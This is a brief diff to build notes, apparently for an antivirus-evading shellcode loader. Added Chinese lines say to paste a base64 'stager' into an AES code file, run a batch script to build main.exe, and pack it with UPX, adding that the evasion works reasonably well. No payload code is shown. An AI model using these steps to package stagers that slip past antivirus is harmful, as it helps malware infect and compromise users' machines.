@@ -22,3 +22,5 @@ upx.exe -9 -q -o zip.exe main.exe
 
 
 ## build.bat
+拷贝stager.bs64中的内容到aes/base64Code.txt
+然后执行bat，生成main.exe，免杀效果还行
